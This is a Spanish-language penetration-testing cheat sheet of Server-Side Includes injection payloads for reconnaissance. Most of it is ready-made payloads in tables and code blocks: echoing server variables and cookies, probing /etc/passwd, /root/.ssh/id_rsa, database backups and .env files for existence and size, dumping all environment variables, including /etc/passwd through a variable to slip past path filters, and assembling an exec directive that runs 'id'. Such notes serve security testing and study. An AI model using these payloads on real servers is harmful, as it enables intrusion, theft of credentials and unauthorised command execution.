---
aliases:
  - SSI Echo Vars
  - SSI Fingerprint
  - SSI Filesystem Enum
  - SSI printenv
tags:
  - vuln/ssi
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Information Gathering

---

## `#echo` Environment Variables

| **Payload** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#echo var="DATE_LOCAL" -->` | Fecha del server | PoC / confirmar SSI activo |
| `<!--#echo var="DOCUMENT_ROOT" -->` | Webroot absoluto | Base para LFI/traversal |
| `<!--#echo var="SERVER_SOFTWARE" -->` | Versión de Apache/IIS | Lookup de CVEs |
| `<!--#echo var="SCRIPT_FILENAME" -->` | Path absoluto del script actual | Layout del filesystem |
| `<!--#echo var="REMOTE_USER" -->` | Usuario de Basic Auth | Si hay auth HTTP |
| `<!--#echo var="REMOTE_ADDR" -->` | IP del cliente | Self-recon |
| `<!--#echo var="HTTP_COOKIE" -->` | Cookies enviadas | Self-recon |
| `<!--#echo var="HTTP_USER_AGENT" -->` | User-Agent del cliente | Reflexión |
| `<!--#echo var="QUERY_STRING" -->` | Query string crudo | Reflexión |
| `<!--#set var="x" value="hello" --><!--#echo var="x" -->` | Define y muestra una var | Confirmar que `#set` funciona |

^ssi-info-echo

---

## `#fsize` y `#flastmod` (Filesystem Enum)

| **Payload** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#fsize file="/etc/passwd" -->` | Tamaño del archivo en bytes | Confirmar existencia + lectura |
| `<!--#flastmod file="/etc/passwd" -->` | Última modificación (timestamp) | Pista de actividad |
| `<!--#fsize file="/root/.ssh/id_rsa" -->` | Tamaño; error = no legible | Oráculo de existencia sin leak |
| `<!--#fsize file="/var/backups/db.sql" -->` | Tamaño del backup | Localizar archivos jugosos |
| `<!--#config sizefmt="bytes" -->` | Tamaño en bytes exactos | Output limpio para `#fsize` |
| `<!--#config errmsg="ERROR" -->` | Mensaje de error custom | Diferenciar existe / no existe |

^ssi-info-fsize

### Filesystem enum sin leakear contenido

```html
<!-- Probe: existence + size only -->
<!--#fsize file="/etc/passwd" -->         <!-- 2847 → exists, readable -->
<!--#fsize file="/root/.ssh/id_rsa" -->   <!-- error → not readable -->
<!--#fsize file="/var/backups/db.sql" --> <!-- 82412 → exists -->
<!--#fsize file="/var/www/html/.env" -->  <!-- 1234 → exists -->

<!-- Modified time -->
<!--#flastmod file="/etc/passwd" -->      <!-- Mon, 01 Jan 2025 -->
<!--#flastmod file="/var/log/auth.log" --> <!-- Recent → activity hint -->
```

---

## `#printenv`, `#set` y `#config`

| **Payload** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#printenv -->` | Dump de TODAS las env vars | Recon completo de una |
| `<!--#set var="x" value="hello" -->` | Define una var local | Base para concat/bypass |
| `<!--#set var="path" value="$DOCUMENT_ROOT/admin" -->` | Var con interpolación de otra | Armar paths dinámicos |
| `<!--#config timefmt="%Y-%m-%d %H:%M" -->` | Formato de fecha custom (strftime) | Output controlado |
| `<!--#if expr="$REMOTE_USER = admin" --> ... <!--#endif -->` | Lógica condicional | Branching / oráculo (Apache) |
| `<!--#set var="p" value="/etc/passwd" --><!--#include file="$p" -->` | Include vía variable | Bypass de filtro sobre el path |

^ssi-info-printenv

### Combine printenv + post-processing

```html
<!-- Full env dump -->
<!--#printenv -->

<!-- Format-controlled output -->
<!--#config timefmt="%Y-%m-%d %H:%M:%S" -->
<!--#flastmod file="/etc/passwd" -->

<!-- Conditional based on env -->
<!--#if expr="${HTTPS} = on" -->
  <p>HTTPS active</p>
<!--#else -->
  <p>HTTP only</p>
<!--#endif -->

<!-- Set variable for filter bypass -->
<!--#set var="cmd_action" value="exec" -->
<!--#set var="target" value="id" -->
<!--# $cmd_action cmd="$target" -->
```

---
